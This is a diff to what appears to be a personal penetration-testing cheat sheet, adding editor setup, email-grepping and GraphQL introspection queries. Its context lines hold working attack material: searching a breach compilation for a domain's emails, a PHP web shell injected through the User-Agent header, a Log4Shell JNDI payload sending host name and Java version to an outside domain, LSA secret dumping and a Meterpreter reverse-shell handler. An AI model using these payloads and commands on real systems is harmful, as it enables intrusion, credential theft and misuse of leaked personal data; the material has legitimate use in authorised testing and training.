@@ -28,7 +28,18 @@ apt install proxychains4 nmap sqlmap links neovim tor curl golang fish
 proxychains4 -q fish
 curl https://www.get-my-ip.info/api/ip
 
-# Editor setup
+# Micro editor setup
+apt install micro git bash-completion
+
+Config in ~/.config/micro/settings.json
+{
+    "colorscheme": "dracula-tc",
+    "lsp.autocompleteDetails": true,
+    "lsp.ignoreMessages": "E501",
+    "lsp.server": "python=pylsp"
+}
+
+# Helix editor setup
 flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
 flatpak remote-add --if-not-exists --subset=verified flathub-verified https://flathub.org/repo/flathub.flatpakrepo
 flatpak install flathub com.helix_editor.Helix
@@ -76,6 +87,13 @@ Source: https://www.tunnelsup.com/hash-analyzer/
 # leak search (leak, grep)
 Search big leaks in a zipped way (bash):
 zgrep -ia "@domain.de" BreachCompilation.tar.gz
+
+# grep emails
+grep -hioE '([a-z0-9\.\-]+@[a-z0-9\.\-]+)' file.csv
+
+# remove doublications (will sort the list)
+sort -u lines.txt
+awk '!a[$0]++' lines.txt
 
 # NETCAT (netcat, nc)
 Listening for shells (bash):
@@ -458,6 +476,10 @@ nikto -host http://host/
 Upload shell via Referer:
 curl 'http://host/notexist' -A "<?php system(\$_GET['cmd']);?>"
 
+# GraphQL (graphql)
+Try introspection
+{"query":"query { \n __schema \n{ \n types \n{ \n name, \n fields \n {\n name \n} \n} \n} \n}"}
+{"query":"query {\n getUserSession(email: \"lala\") \n{ \n email \n} \n}"}
 
 # MONGODB
 mongo
@@ -504,8 +526,6 @@ ${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xx.inte
 
 # ENUM4LINUX
 enum4linux 10.10.82.233
-
-
 
 # NFS (nfs, network share, linux)
 showmount -e 10.129.57.246
@@ -573,7 +593,6 @@ lsa_dump_secrets
 Custom:
 loadpath /usr/share/metasploit-framework/modules/
 reload_all
-
 
 Meterpreter (multi/handler, reverse shell):
 use multi/handler
